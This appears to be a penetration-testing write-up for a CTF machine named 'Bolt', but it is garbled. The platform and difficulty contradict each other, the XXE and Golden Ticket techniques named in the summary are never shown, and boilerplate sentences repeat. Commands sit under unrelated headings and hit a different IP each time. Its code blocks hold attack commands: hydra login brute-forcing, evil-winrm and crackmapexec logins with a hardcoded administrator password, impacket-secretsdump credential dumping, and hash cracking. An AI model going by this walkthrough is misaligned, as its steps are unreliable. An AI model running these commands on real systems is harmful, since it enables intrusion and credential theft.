---
TitleSEO: "TryHackMe — Bolt (Easy Windows) | ZureFX"
TitlePost: "TryHackMe — Bolt (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Bolt. XXE and Golden Ticket to achieve easy compromise on Windows."
Keywords: "hard, hackthebox, offsec"
URL: "https://zurefx.github.io/writeups/htb-bolt-121.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-bolt-121/"
Date: "2025-01-30"
Tags: "Hard, HackTheBox, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-bolt-121"
Permalink: "/writeups/htb-bolt-121.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Bolt** is rated **Easy** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.88.230.11`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
evil-winrm -i 10.26.162.218 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p8443,5986,21 10.85.212.10 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

### SMB Enumeration

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
evil-winrm -i 10.70.171.109 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.55.219.166 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.16.6 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **Weak Service Permissions**.

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.112.177.240 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.108.51.194 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
crackmapexec smb 10.28.182.80 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.231.184/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.124.53.70
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `hydra`
- `lookupsid`
- `msfvenom`
- `nikto`
- `smbclient`

### Key Takeaways

- XXE
- Golden Ticket
- ACL Abuse
- Weak Service Permissions
